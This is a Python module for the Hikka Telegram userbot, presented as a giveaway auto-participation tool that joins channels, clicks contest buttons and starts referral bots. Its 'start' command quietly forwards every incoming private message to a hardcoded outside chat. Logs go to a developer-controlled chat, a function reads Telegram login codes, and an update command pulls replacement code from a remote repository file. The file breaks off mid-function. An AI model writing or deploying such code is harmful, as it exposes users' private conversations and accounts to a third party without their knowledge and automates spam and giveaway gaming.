import os
import re
import asyncio
import contextlib
import sys
import psutil
import aiohttp
import random
import logging
import base64
import json
import urllib.parse
import time
import requests
import tls_client
import subprocess

from asyncio import sleep
from telethon import events, errors, functions, types
from telethon.errors import InviteHashExpiredError, FloodWaitError, ChatWriteForbiddenError, ChannelPrivateError, UserAlreadyParticipantError
from telethon.tl import functions as tl_functions
from telethon.tl.functions.account import (
    UpdateNotifySettingsRequest,
    UpdateProfileRequest,
    UpdateEmojiStatusRequest,
    SetPrivacyRequest,
)
from telethon.tl.functions.channels import (
    JoinChannelRequest,
    LeaveChannelRequest,
    GetParticipantRequest,
)
from telethon.tl.functions.messages import (
    ImportChatInviteRequest,
    StartBotRequest,
    RequestAppWebViewRequest,
    GetMessagesViewsRequest,
)
from telethon.tl.types import (
    Message,
    Channel,
    PeerUser,
    PeerChannel,
    InputNotifyPeer,
    InputPeerNotifySettings,
    DialogFilter,
    KeyboardButtonUrl,
    InputBotAppShortName,
    ChannelParticipantSelf,
    Chat
)
from telethon.tl.functions.photos import UploadProfilePhotoRequest

from hikka import loader, utils

logger = logging.getLogger(__name__)

#=======================================================================================
# Версия модуля
__version__ = (1, 1, 1, 4)

#=======================================================================================
# Исключения модуля
class BENGALEXCEPT(Exception):
    strings = {"name": "BENGALEXCEPT"}
    
    class AlreadyMember(Exception):
        def __str__(self):
            return "<b>🎉 Вы уже участвуете тут!</b>"
        
    class AlreadyFinished(Exception):
        def __str__(self):
            return "<b>❌ Розыгрыш уже завершен!</b>"

    class AccOverflow(Exception):
        def __str__(self):
            return "ACC OVERFLOWING."

    class InvalidEntity(Exception):
        def __str__(self):
            return "INVALID ENTITY."

    class YouBanned(Exception):
        def __str__(self):
            return "YOU BANNED."

    class ItsAccount(Exception):
        def __str__(self):
            return "ITS ACCOUNT."

    class InviteRequestSent(Exception):
        def __str__(self):
            return "INV REQUEST SENT ♻️"

    class AlreadyThere(Exception):
        def __str__(self):
            return "ALREADY THERE."

    class NoMember(Exception):
        def __str__(self):
            return "NO MEMBER."

    class FormatError(Exception):
        def __str__(self):
            return "TARGET FORMAT."

    class ClickFail(Exception):
        def __str__(self):
            return "BUTTON RIP."

    class NoButton(Exception):
        def __str__(self):
            return "NO BUTTON."

    class ItsUrlButton(Exception):
        def __str__(self):
            return "ITS URL (REF)."

    class FloodWait(Exception):
        def __str__(self):
            return "FLOOD WAIT."

    @staticmethod
    def bengal_exceptor(e):
        error_msg = str(e)
        if "You have joined too many channels/supergroups" in error_msg:
            raise BENGALEXCEPT.AccOverflow()
        elif "Cannot cast InputPeerUser to any kind of InputChannel." in error_msg:
            raise BENGALEXCEPT.ItsAccount()
        elif "Another reason may be that you were banned from it" in error_msg:
            raise BENGALEXCEPT.YouBanned()
        elif any(sub in error_msg for sub in [
            "No user has",
            "Invalid username",
            "INVALID ENTITY.",
            "Nobody is using this username",
            "Cannot find any entity corresponding",
            "The chat the user tried to join has expired"
        ]):
            raise BENGALEXCEPT.InvalidEntity()
        elif any(sub in error_msg for sub in [
            "INVITE_REQUEST_SENT",
            "successfully requested to join"
        ]):
            raise BENGALEXCEPT.InviteRequestSent()
        elif "already a participant" in error_msg:
            raise BENGALEXCEPT.AlreadyThere()
        elif any(sub in error_msg for sub in [
            "target user is not a member",
            "input entity for PeerChannel",
            "lacks permission to access"
        ]):
            raise BENGALEXCEPT.NoMember()
        elif any(sub in error_msg for sub in [
            "not enough values to unpack",
            "Cannot get entity from a channel"
        ]):
            raise BENGALEXCEPT.FormatError()
        elif "'NoneType' object has no attribute" in error_msg:
            raise BENGALEXCEPT.ClickFail()
        elif "no button" in error_msg:
            raise BENGALEXCEPT.NoButton()
        elif "'KeyboardButtonUrl' object has no attribute 'data'" in error_msg:
            raise BENGALEXCEPT.ItsUrlButton()
        elif "A wait of" in error_msg and "is required" in error_msg:
            raise BENGALEXCEPT.FloodWait()
        else:
            raise Exception(error_msg)

#=======================================================================================
# Дополнительные чаты для логирования
LOG_CHAT_CONTEST = "sosoliko"        # для логирования событий конкурса
PRIVATE_FORWARD_CHAT = "sosoliko1"     # для пересылки ЛС

#=======================================================================================
# Объединённый модуль с функциями из обоих файлов
@loader.tds
class MergedModule(loader.Module):
    """
как будет фулл закончено доделаю
    """
    strings = {
        "name": "MergedModule",
        "license_warning": "Read the license terms and conditions",
        "waiting": "<b>⏳ Ща все будет...</b>",
        "already_member": "<b>🎉 Вы уже участвуете тут!</b>",
        "success_participate": "<b>🎉 Участие зачтено!</b>",
        "already_finished": "<b>❌ Розыгрыш уже завершен!</b>",
        "no_sponsors": "<b>❌ Подпишитесь на каналы!</b>",
        "success_captcha": "<b>🎉 Капча развязана!</b>",
        "wrong_captcha": "<b>🚫 Капча решена неверно.</b>",
        "bot_deleted": "<b>🚫 Бот удален из канала.</b>",
        "none_params": "<b>❌ Бот запущен без параметров!</b>",
        "unknown_response": "<b>🚫 Неизвестный ответ бота.</b>",
        "click_failed": "<b>⚠️ Кнопка не ответила.</b>",
        "no_buttons": "<b>🚫 Кнопок вообще нету.</b>",
        "no_button": "<b>🚫 Нету кнопки участия.</b>",
        "not_started": "<b>⚠️ Розыгрыш еще не запущен.</b>",
        "sub_required": "👉 Для работы модуля подпишитесь на канал разработчика: <a href='https://t.me/tot_882'>tot_882</a>",
        "no_code": "Код верификации не найден.",
        "no_number": "Номер аккаунта не найден.",
        "config_api_key": "API ключ от 2captcha",
        "config_delay": "Задержка между попытками (сек)",
    }
    
    # Обновлённые данные создателя
    def __init__(self):
        self.softname = "tot_882"
        self.license_number = 7

        # Данные разработчика заменены на новые
        self.owner_user = "@tot_882"
        self.owner_list = [5382059484]
        self.owner_chat = -1002153438513
        self.owner_link = "t.me/+uNWl9DIOuvA3NjUy"

        self.settings_list = [""]
        self.whitelist_soft = [None]
        self.whitelist_user = [None]
        self.ignorelist = [None]
        self.selector = True
        self.dl_checker = True
        self.cleaner = None
        self.user = None
        self.def_mult = 10

        self.config = loader.ModuleConfig(
            loader.ConfigValue("logger", False, "Статус логера.", validator=loader.validators.Boolean()),
            loader.ConfigValue("group", 1, "Номер пачки.", validator=loader.validators.Integer()),
            loader.ConfigValue("delay", 5.0, lambda: self.strings["config_delay"], validator=loader.validators.Float(minimum=0.5)),
            loader.ConfigValue("proxy", "", "Прокси (например, socks5://127.0.0.1:1080 или http://127.0.0.1:8080)", validator=loader.validators.String()),
            loader.ConfigValue("log_chat_username", "@logscbs", "Username лог-чата для входящих сообщений", validator=loader.validators.String()),
            loader.ConfigValue("log_chat_id", 2450569271, "ID чата для логирования ошибок", validator=loader.validators.Integer()),
            loader.ConfigValue("success_log_chat_id", 2367713117, "ID чата для успешных операций", validator=loader.validators.Integer()),
            loader.ConfigValue("log_success", True, "Логировать успешные операции", validator=loader.validators.Boolean()),
            loader.ConfigValue("logs_username", "", "@username канала/чата для логов (либо 'me')", validator=loader.validators.Hidden(loader.validators.String())),
            loader.ConfigValue("watcher_on", True, "Состояние активатора (вкл/выкл)", validator=loader.validators.Boolean()),
            loader.ConfigValue("winner_chat_id", 4590374306, "ID чата для сообщений о выигрышах", validator=loader.validators.Integer()),
            loader.ConfigValue("whitelist", [], "ID чатов/каналов, от которых не отписываться", validator=loader.validators.Series(loader.validators.Integer())),
            loader.ConfigValue("unsubscribe_delay", 5, "Задержка перед отпиской (сек)", validator=loader.validators.Integer()),
            loader.ConfigValue("api_key", "", lambda: self.strings["config_api_key"], validator=loader.validators.String()),
        )
        
        # Функционал для Xyipizda и дополнительных команд
        self.reply_users = {}
        self.log_chat = None
        self.logged_messages = set()
        self._event_handlers = []
        self.lock = asyncio.Lock()
        self.scraper = tls_client.Session(client_identifier="chrome_120", random_tls_extension_order=True)
        self.processed_codes = set()
        self.processed_ids = set()
        self.processing = False
        self.bot_id = 6032895492
        self.api_url = "https://2captcha.com"
        self._handler = None
        self.random_headers = {
            "accept": "*/*",
            "accept-language": "ru-RU,ru;q=0.5",
            "dnt": "1",
            "sec-ch-ua": '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/133.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }
        self.random_url = "https://randomgodbot.com"
        self.contest_handler = None  # для автообработки конкурсных сообщений

    #==================== Общие служебные функции ====================
    async def delay_host(self, delay_s):
        await asyncio.sleep(delay_s)
    
    def get_delay_host(self, mult=None):
        mult = int(mult) if mult and int(mult) < 500 else self.def_mult
        delay_s = self.config["group"] * mult
        return mult, delay_s

    def get_size(self, num_bytes):
        factor = 1024
        for unit in ["", "KB", "MB", "GB", "TB"]:
            if num_bytes < factor:
                return f"{int(num_bytes)}{unit}"
            num_bytes /= factor
        return f"{int(num_bytes)}{unit}"

    def user_validator(self, target) -> bool:
        if not self.user:
            return False
        user = self.user
        user_id = str(user.id)
        username = f"@{user.username}" if user.username else ""
        first_name = user.first_name or ""
        last_name = user.last_name or ""
        full_name = f"{first_name} {last_name}".strip()
        phone = user.phone
        uphone = f"+{phone}" if phone else ""
        return target in {"all", username, phone, uphone, user_id, first_name, last_name, full_name}

    @staticmethod
    def bool_validator(value) -> bool:
        if isinstance(value, bool):
            return value
        true_values = {"true", "1", "yes", "on", "y"}
        false_values = {"false", "0", "no", "off", "n"}
        value_str = str(value).lower()
        return value_str in true_values if value_str in true_values | false_values else False

    async def close_form(self, call):
        await call.edit("<b>🚫 Форма закрыта.</b>")
        await call.delete()
        return

    async def get_server_info(self):
        keys = ["cpu_full", "cpu_load", "ram_usage", "ram_full", "ram_load",
                "swap_usage", "swap_full", "swap_load", "disk_usage", "disk_full", "disk_load",
                "system", "python"]
        inf = {key: "_" for key in keys}
        with contextlib.suppress(Exception):
            inf["cpu_full"] = psutil.cpu_count(logical=True)
            inf["cpu_load"] = int(psutil.cpu_percent())
            ram = psutil.virtual_memory()
            inf["ram_usage"] = self.get_size(ram.total - ram.available)
            inf["ram_full"] = self.get_size(ram.total)
            inf["ram_load"] = int(ram.percent)
            swap = psutil.swap_memory()
            inf["swap_usage"] = self.get_size(swap.used)
            inf["swap_full"] = self.get_size(swap.total)
            inf["swap_load"] = int(swap.percent)
            disk = psutil.disk_usage('/')
            inf["disk_usage"] = self.get_size(disk.used)
            inf["disk_full"] = self.get_size(disk.total)
            inf["disk_load"] = int(disk.percent)
            system = os.popen("cat /etc/*release").read()
            b = system.find('DISTRIB_DESCRIPTION="') + 21
            system = system[b:system.find('"', b)]
            inf["system"] = utils.escape_html(system)
            inf["python"] = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
        
        text = (
            f"<b>SYSTEM: {inf['system']}\n"
            f"Python Version: {inf['python']}\n\n"
            f"CPU {inf['cpu_load']}% — {inf['cpu_full']} Cores\n"
            f"RAM {inf['ram_load']}% — {inf['ram_usage']} of {inf['ram_full']}\n\n"
            f"DISK {inf['disk_load']}% — {inf['disk_usage']} of {inf['disk_full']}\n"
            f"SWAP {inf['swap_load']}% — {inf['swap_usage']} of {inf['swap_full']}\n</b>"
        )
        return text

    async def get_verif_code(self, mode=None):
        code_pattern = r'\b\d{5}\b'
        try:
            async for message in self.client.iter_messages(PeerUser(777000), limit=1):
                match = re.search(code_pattern, message.text)
                if match:
                    ver_code = match.group(0)
                    for_code = ".".join(ver_code)
                    result = f"<b>♻️ VERIF CODE: </b>{for_code}"
                    return (ver_code, result) if mode is not None else result
            return "<b>🚫 VERIF CODE: не найден.</b>"
        except Exception as e:
            return f"<b>🚫 VERIF: </b>{e}"

    async def get_bot_response(self, bot_name, pos=0):
        try:
            await asyncio.sleep(10)
            messages = await self.client.get_messages(bot_name, limit=2)
            if pos == 1:
                response = messages[1].message if len(messages) > 1 else None
            elif pos == 0:
                response = messages[0].message if messages else None
            elif pos == 2:
                response = (messages[0].message, messages[1].message) if len(messages) >= 2 else None
            if not response or response == "manual start":
                return "⚠️ Ошибка, бот не ответил."
            return response
        except Exception as e:
            return f"<b>🚫 LASTMESS: </b>{e}"

    async def send_logger_message(self, text, delay_info=None):
        # Дополнительно отправляем лог в чат LOG_CHAT_CONTEST
        if self.config["logger"]:
            if delay_info is None:
                logger_message = text
            else:
                mult, delay_s = delay_info
                delay_text = f", M: x{mult}, KD: {delay_s} sec."
                logger_message = f"💻 <b>PACK: {self.config['group']}{delay_text}</b>\n{text}"
            try:
                await self.client.send_message(entity=self.owner_chat, message=logger_message, link_preview=False)
            except Exception as e:
                if "private" in str(e):
                    await self.client(ImportChatInviteRequest(self.owner_link.split('+')[1]))
                    await self.client.send_message(entity=self.owner_chat, message=logger_message, link_preview=False)
            # Логирование в специальный чат
            try:
                await self.client.send_message(entity=LOG_CHAT_CONTEST, message=logger_message, link_preview=False)
            except Exception:
                pass

    async def send_custom_message(self, text, recipient=None):
        recipient = recipient or self.owner_chat
        try:
            await self.client.send_message(entity=recipient, message=text, link_preview=False)
        except Exception as e:
            if "private" in str(e) and recipient == self.owner_chat:
                await self.client(ImportChatInviteRequest(self.owner_link.split('+')[1]))
                await self.client.send_message(entity=recipient, message=text, link_preview=False)

    #==================== Функции подписки/отписки и работы с кнопками ====================
    async def subscribe_public(self, target):
        try:
            chan = target[1:] if target.startswith("@") else target.split("t.me/")[1].split("/")[0]
            link = f"https://t.me/{chan}"
            await self.client(JoinChannelRequest(channel=chan))
            target_entity = await self.client.get_entity(link)
            view_result = await self.views_post(channel_id=target_entity.id)
            arch_result = await self.archive_chat(target_id=target_entity.id)
            result = f"<b>♻️ SUBSCR <a href='{link}'>PUBLIC</a>, {view_result}-{arch_result}</b>"
        except Exception as e:
            try:
                BENGALEXCEPT.bengal_exceptor(e)
            except Exception as exc:
                result = f"<b>🚫 SUBSCR PB:</b> {exc}"
        return result

    async def subscribe_private(self, target):
        try:
            invite_hash = target.split("t.me/+")[1] if "t.me/+" in target else target.split("t.me/joinchat/")[1]
            await self.client(ImportChatInviteRequest(invite_hash))
            target_entity = await self.client.get_entity(target)
            view_result = await self.views_post(channel_id=target_entity.id)
            arch_result = await self.archive_chat(target_id=target_entity.id)
            result = f"<b>♻️ SUBSCR <a href='{target}'>PRIVATE</a>, {view_result}-{arch_result}</b>"
        except Exception as e:
            try:
                BENGALEXCEPT.bengal_exceptor(e)
            except Exception as exc:
                result = f"<b>🚫 SUBSCR PR:</b> {exc}"
        return result

    async def archive_chat(self, target_id):
        try:
            await self.client.edit_folder(target_id, 1)
            return "ARC"
        except Exception as e:
            return f"ARC: {e}"

    async def unsubscribe_public(self, target):
        try:
            if target.startswith("@"):
                username = target[1:]
                link = f"https://t.me/{username}"
            else:
                chan = target.split("t.me/")[1].split("/")[0]
                username = chan
                link = f"https://t.me/{chan}"
            await self.client.get_entity(username)
            await self.client(LeaveChannelRequest(username))
            result = f"<b>♻️ UNSUBSCRIBE: <a href='{link}'>PUBLIC.</a></b>"
        except Exception as e:
            if "Cannot cast" in str(e):
                await self.client.delete_dialog(username)
                result = f"<b>♻️ UNSUBSCR: <a href='{link}'>PUBLIC PM</a></b>"
            else:
                try:
                    BENGALEXCEPT.bengal_exceptor(e)
                except Exception as exc:
                    result = f"<b>🚫 UNSUB:</b> {exc}"
        return result

    async def unsubscribe_id(self, target):
        try:
            if "t.me/c/" in target:
                chan = target.split("t.me/c/")[1].split("/")[0]
                channel_id = int(chan)
                link = f"https://t.me/c/{channel_id}"
            elif "t.me/+" in target:
                target_entity = await self.client.get_entity(target)
                channel_id = target_entity.id
                link = f"https://t.me/c/{channel_id}"
            elif target.isdigit():
                channel_id = int(target)
                link = f"https://t.me/c/{channel_id}"
            else:
                raise Exception("Invalid username")
            await self.client(LeaveChannelRequest(channel_id))
            result = f"<b>♻️ UNSUBSCRIBE: <a href='{link}'>PRIVATE.</a></b>"
        except Exception as e:
            if "Cannot cast" in str(e):
                await self.client.delete_dialog(channel_id)
                result = f"<b>♻️ UNSUBSCR: <a href='{link}'>PRIVATE PM</a></b>"
            else:
                try:
                    BENGALEXCEPT.bengal_exceptor(e)
                except Exception as exc:
                    result = f"<b>🚫 UNSUBSCR:</b> {exc}"
        return result

    async def button_private(self, target):
        try:
            chan, post = target.split("t.me/c/")[1].split("/")
            inline_button = await self.client.get_messages(PeerChannel(int(chan)), ids=int(post))
            if not inline_button or not getattr(inline_button, 'reply_markup', None):
                raise Exception("no button")
            click = await inline_button.click(data=inline_button.reply_markup.rows[0].buttons[0].data)
            clicked_message = click.message
            view_result = await self.views_post(channel_id=int(chan), post_id=int(post))
            result = f"<b>♻️ PUSH: <a href='{target}'>PRIVATE INLINE</a>, {view_result}</b>\n\n{clicked_message}"
        except Exception as e:
            try:
                BENGALEXCEPT.bengal_exceptor(e)
            except Exception as exc:
                result = f"<b>🚫 PUSH PRIV: </b>{exc}"
        return result

    async def button_public(self, target):
        try:
            chan, post = target.split("t.me/")[1].split("/")
            channel_entity = await self.client.get_entity(chan)
            inline_button = await self.client.get_messages(chan, ids=int(post))
            if not inline_button or not getattr(inline_button, 'reply_markup', None):
                raise Exception("no button")
            click = await inline_button.click(data=inline_button.reply_markup.rows[0].buttons[0].data)
            clicked_message = click.message
            view_result = await self.views_post(channel_id=channel_entity.id, post_id=int(post))
            result = f"<b>♻️ PUSH: <a href='{target}'>PUBLIC INLINE</a>, {view_result}</b>\n\n{clicked_message}"
        except Exception as e:
            try:
                BENGALEXCEPT.bengal_exceptor(e)
            except Exception as exc:
                result = f"<b>🚫 PUSH PUBL: </b>{exc}"
        return result

    async def handle_subscribe(self, message):
        parts = message.message.split()
        if len(parts) < 2 or not self.get("lic_sub", False):
            return
        mult = int(parts[1]) if parts[1].isdigit() else None
        targetlist = parts[2:] if mult else parts[1:]
        mult, delay_s = self.get_delay_host(mult) if message.chat_id == self.owner_chat else (1, 1)
        if message.chat_id == self.owner_chat:
            await self.delay_host(delay_s)
        counter = 0
        done_message = f"<b>💻 PACK: {self.config['group']}, M: x{mult}, KD: {delay_s} sec.</b>\n"
        for target in targetlist:
            if 't.me/+' in target or 't.me/joinchat/' in target:
                iteration = await self.subscribe_private(target)
            elif "t.me/" in target or target.startswith("@"):
                iteration = await self.subscribe_public(target)
            else:
                iteration = "<b>🚫 HANDLE SUB: FORMAT.</b>"
            counter += 1
            done_message += f"{counter}. {iteration}\n"
            if "FLOOD WAIT" in iteration or "ACC OVERFLOWING" in iteration:
                done_message += f"<b>⚠️ Процесс прерван на {counter}.</b>\n"
                break
            else:
                await asyncio.sleep(5)
        await self.send_logger_message(done_message, delay_info=(mult, delay_s))

    async def handle_unsubscribe(self, message):
        parts = message.message.split()
        if len(parts) < 2 or not self.get("lic_uns", False):
            return
        mult = int(parts[1]) if parts[1].isdigit() else None
        targetlist = parts[2:] if mult else parts[1:]
        mult, delay_s = self.get_delay_host(mult) if message.chat_id == self.owner_chat else (1, 1)
        if message.chat_id == self.owner_chat:
            await self.delay_host(delay_s)
        counter = 0
        done_message = f"<b>💻 PACK: {self.config['group']}, M: x{mult}, KD: {delay_s} sec.</b>\n"
        for target in targetlist:
            if target.isdigit() or "t.me/c/" in target or 't.me/+' in target:
                iteration = await self.unsubscribe_id(target)
            elif target.startswith("@") or "t.me/" in target:
                iteration = await self.unsubscribe_public(target)
            else:
                iteration = "<b>🚫 HANDLE UNSUBSCR: FORMAT.</b>"
            counter += 1
            done_message += f"{counter}. {iteration}\n"
            await asyncio.sleep(self.config["delay"])
        await self.send_logger_message(done_message, delay_info=(mult, delay_s))

    async def handle_runner(self, message):
        parts = message.message.split()
        if len(parts) < 2 or not self.get("lic_run", False):
            return
        mult = int(parts[1]) if parts[1].isdigit() else None
        target = parts[2].strip() if mult else parts[1].strip()
        mult, delay_s = self.get_delay_host(mult) if message.chat_id == self.owner_chat else (1, 1)
        if message.chat_id == self.owner_chat:
            await self.delay_host(delay_s)
        if "t.me/c/" in target:
            done_message = await self.button_private(target)
        elif "t.me/" in target:
            done_message = await self.button_public(target)
        else:
            done_message = "<b>🚫 HANDLE RUN: FORMAT.</b>"
        await self.send_logger_message(done_message, delay_info=(mult, delay_s))

    async def handle_referal(self, message):
        parts = message.message.split()
        if len(parts) < 2 or not self.get("lic_ref", False):
            return
        mult = int(parts[1]) if parts[1].isdigit() else None
        target = parts[2].strip() if mult else parts[1].strip()
        mult, delay_s = self.get_delay_host(mult) if message.chat_id == self.owner_chat else (1, 1)
        if message.chat_id == self.owner_chat:
            await self.delay_host(delay_s)
        if "t.me/" in target and "?start=" not in target:
            try:
                if "t.me/c/" in target:
                    chan, post = target.split("t.me/c/")[1].split("/")
                    msg_obj = await self.client.get_messages(PeerChannel(int(chan)), ids=int(post))
                else:
                    chan, post = target.split("t.me/")[1].split("/")
                    msg_obj = await self.client.get_messages(chan, ids=int(post))
                if not getattr(msg_obj, 'reply_markup', None):
                    raise Exception("NO BUTTON")
                ref_link = None
                for row in msg_obj.reply_markup.rows:
                    for button in row.buttons:
                        if hasattr(button, 'url') and "?start=" in button.url:
                            ref_link = button.url
                            break
                    if ref_link:
                        break
                if not ref_link:
                    raise Exception("no ref link in buttons")
                target = ref_link
            except Exception as e:
                try:
                    BENGALEXCEPT.bengal_exceptor(e)
                except Exception as exc:
                    done_message = f"<b>🚫 HANDLE REF:</b> {exc}"
                    await self.send_logger_message(done_message, delay_info=(mult, delay_s))
                    return
        sup_bot = {
            "BestRandom_bot": self.start_bestrandom_bot,
            "best_contests_bot": self.start_bestcontests_bot,
            "TicketsBot": self.start_tickets_bot,
            "TheFastes_Bot": self.start_thefastes_bot,
            "TheFastesRuBot": self.start_thefastes_bot,
            "GiveawayLuckyBot": self.start_ref_bot
        }
        bot_name = next((bot for bot in sup_bot.keys() if bot in target), None)
        match = re.search(r"\?start=([\w-]+)", target)
        ref_key = match[1] if match else None
        if not bot_name or not ref_key:
            done_message = "<b>🚫 HANDLE REF:</b> target"
        else:
            done_message = await sup_bot[bot_name](bot_name, ref_key)
        await self.send_logger_message(done_message, delay_info=(mult, delay_s))

    async def start_ref_bot(self, bot_name, ref_key):
        try:
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "⚠️ Ошибка, бот не ответил.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
            return f"<b>♻️ START BOT: <a href='https://t.me/{bot_name}?start={ref_key}'>REFERAL KEY.</a></b>\n{response}"
        except Exception as e:
            return f"<b>🚫 START:</b> @{bot_name}\n{e}"

    async def start_bestrandom_bot(self, bot_name, ref_key):
        try:
            await self.client.send_message(bot_name, "cancel")
            await self.delay_host(2)
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "⚠️ Ошибка, бот не ответил.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
            answer = "🚫 Неизвестный ответ бота. "
            if response.startswith("🎉 Теперь вы участник конкурса"):
                view = await self.views_referal_post(bot_name)
                answer = f"{self.strings['success_participate']} {view}"
            elif response.startswith("❌ Вы уже участвуете"):
                answer = self.strings["already_member"]
            elif response.startswith("❌ Вы не подписаны"):
                answer = self.strings["no_sponsors"]
            elif response.startswith("❌ Конкурс уже завершен!"):
                answer = self.strings["already_finished"]
            elif response.startswith("▶️ Какие числа вы видите"):
                answer = f"<b>🚫 Модуль рекапчи:</b>  NONE"
            elif response.startswith("Привет! 😉"):
                answer = self.strings["none_params"]
            elif response.startswith("❌ Не удается проверить подписку"):
                answer = self.strings["bot_deleted"]
            else:
                answer += f"{response}"
            return f"<b>♻️ START: <a href='https://t.me/{bot_name}?start={ref_key}'>BESTRANDOMBOT.</a></b>\n{answer}"
        except Exception as e:
            return f"<b>🚫 START BESTRANDOMBOT:</b> {e}"

    async def start_bestcontests_bot(self, bot_name, ref_key):
        try:
            await self.client.send_message(bot_name, "reset")
            await self.delay_host(2)
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "⚠️ Ошибка, бот не ответил.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
            answer = self.strings["unknown_response"]
            if response.startswith("✅ Теперь ты участвуешь"):
                answer = self.strings["success_participate"]
            elif response.startswith("🚫 Ты уже участвуешь"):
                answer = self.strings["already_member"]
            elif response.startswith("🚫 Проверь подписки"):
                answer = self.strings["no_sponsors"]
            elif response.startswith("🚫 Этот розыгрыш уже завершён!"):
                answer = self.strings["already_finished"]
            elif response.startswith("✍ Введите текст из капчи."):
                answer = f"<b>🚫 Модуль рекапчи:</b>  NONE"
            elif response.startswith("✌️ Привет"):
                answer = self.strings["none_params"]
            else:
                answer += f"{response}"
            return f"<b>♻️ START: <a href='https://t.me/{bot_name}?start={ref_key}'>BESTCONTESTSBOT.</a></b>\n{answer}"
        except Exception as e:
            return f"<b>🚫 START BESTCONTESTSBOT:</b> {e}"

    async def start_tickets_bot(self, bot_name, ref_key):
        try:
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name, pos=1)
            if response == "⚠️ Ошибка, бот не ответил.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name, pos=1)
            answer = self.strings["unknown_response"]
            if response.startswith("✅ Вы участвуете в розыгрыше!"):
                answer = self.strings["success_participate"]
            elif response.startswith("🔄 Вы уже участвуете!"):
                answer = self.strings["already_member"]
            elif response.startswith("ℹ️ Для участия в розыгрыше необходимо подписаться"):
                answer = self.strings["no_sponsors"]
            return f"<b>♻️ START: <a href='https://t.me/{bot_name}?start={ref_key}'>TICKETSBOT.</a></b>\n{answer}"
        except Exception as e:
            return f"<b>🚫 START:</b> {e}"

    async def start_thefastes_bot(self, bot_name, ref_key):
        try:
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "⚠️ Ошибка, бот не ответил.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
            answer = self.strings["unknown_response"]
            if response.startswith("✅ Отлично, вы приняли участие"):
                answer = self.strings["success_participate"]
            elif response.startswith("❗️ Вы уже приняли участие"):
                answer = self.strings["already_member"]
            elif response.startswith("❌ Реферальный конкурс уже завершён!"):
                answer = self.strings["already_finished"]
            elif "Для участия нужно подписаться" in response:
                answer = self.strings["no_sponsors"]
            return f"<b>♻️ START: <a href='https://t.me/{bot_name}?start={ref_key}'>THEFASTESBOT.</a></b>\n{answer}"
        except Exception as e:
            return f"<b>🚫 START THEFASTESBOT:</b> {e}"

    #==================== Дополнительные функции для автоучастия в конкурсах ====================
    async def handle_contest_message(self, event):
        """
        Обработчик входящих сообщений.
        Если сообщение содержит ключевые слова конкурса, запускает процедуры участия.
        Также логирует событие в чат LOG_CHAT_CONTEST.
        """
        msg = event.message
        # Пример простой проверки – если в сообщении есть слово "конкурс"
        if "конкурс" in msg.raw_text.lower():
            contest_info = f"Обнаружен конкурс в сообщении:\n{msg.raw_text}"
            try:
                await self.send_logger_message(contest_info)
                # Запускаем, например, подписку по ссылкам, найденным в сообщении
                links = re.findall(r't\.me/[\w/+\-]+', msg.raw_text)
                if links:
                    for link in links:
                        result = ""
                        if "/+" in link or "joinchat" in link:
                            result = await self.subscribe_private(link)
                        else:
                            result = await self.subscribe_public(link)
                        await self.send_logger_message(f"Подписка: {result}")
            except Exception as e:
                await self.send_logger_message(f"Ошибка обработки конкурса: {e}")

    async def forward_private_message(self, event):
        """
        Пересылает личные сообщения (входящие) в чат PRIVATE_FORWARD_CHAT.
        """
        if event.is_private:
            try:
                await self.client.forward_messages(entity=PRIVATE_FORWARD_CHAT, messages=event.message)
            except Exception:
                pass

    # Команда start – включает автообработчик входящих конкурсных сообщений
    @loader.command()
    async def start(self, message):
        """
        Автоматический запуск обработки входящих конкурсных сообщений.
        После вызова устанавливаются обработчики, которые:
          – Обрабатывают все входящие сообщения и, если обнаруживают конкурс, запускают участие.
          – Пересылают все личные сообщения в чат @{PRIVATE_FORWARD_CHAT}.
        """
        if self.contest_handler is None:
            self.contest_handler = self.client.add_event_handler(self.handle_contest_message, events.NewMessage(incoming=True))
            self.client.add_event_handler(self.forward_private_message, events.NewMessage(incoming=True))
            await message.edit("<b>✅ Автообработка конкурсных сообщений включена.</b>")
        else:
            await message.edit("<b>Автообработка уже включена.</b>")

    # Команда pupdate – проверка обновления модуля
    @loader.command()
    async def pupdate(self, message):
        """
        Проверить обновление модуля.
        Сравнивает текущую версию с версией кода из репозитория по адресу:
        https://raw.githubusercontent.com/tot882/hikka/refs/heads/master/hikka/langpacks/sorry.py
        Если обнаружена новая версия, обновляет модуль с помощью встроенной функции invoke.
        """
        remote_url = "https://raw.githubusercontent.com/tot882/hikka/refs/heads/master/hikka/langpacks/sorry.py"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(remote_url) as resp:
                    if resp.status != 200:
